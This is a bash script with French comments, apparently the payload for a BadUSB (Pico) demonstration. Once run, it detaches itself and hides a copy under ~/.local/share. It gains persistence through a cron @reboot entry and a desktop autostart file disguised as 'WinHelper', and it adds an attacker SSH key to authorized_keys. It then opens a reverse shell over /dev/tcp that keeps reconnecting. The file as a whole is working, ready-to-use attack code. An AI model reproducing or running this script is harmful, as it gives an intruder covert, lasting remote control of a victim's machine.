#!/bin/bash
IP="192.168.1.50"        # IP de ton serveur
PORT="4444"
SELF="$HOME/.local/share/.whelper.sh"

# 0) auto-détachement : le shell survit à la fermeture du terminal
if [ -z "$_W" ]; then
  _W=1 setsid bash "$0" >/dev/null 2>&1
  exit 0
fi

# 1) copie locale discrète
mkdir -p "$(dirname "$SELF")"
cp "$0" "$SELF" 2>/dev/null && chmod +x "$SELF"

# 2) persistance : redémarrage via cron
( crontab -l 2>/dev/null | grep -vF "$SELF"; echo "@reboot /bin/bash $SELF" ) | crontab -

# 3) persistance : autostart de session graphique
mkdir -p "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/whelper.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=WinHelper
Exec=/bin/bash $SELF
Terminal=false
X-GNOME-Autostart-enabled=true
EOF

# 4) BONUS démo : clé SSH de secours (accès persistant sans le Pico)
mkdir -p "$HOME/.ssh"
grep -qF "demo-badusb" "$HOME/.ssh/authorized_keys" 2>/dev/null || \
  echo 'ssh-ed25519 AAAA...TA_CLE demo-badusb' >> "$HOME/.ssh/authorized_keys"
chmod 700 "$HOME/.ssh"; chmod 600 "$HOME/.ssh/authorized_keys"

# 5) reverse shell avec reconnexion automatique
while :; do
  bash -i >& /dev/tcp/$IP/$PORT 0>&1
  sleep 3
done
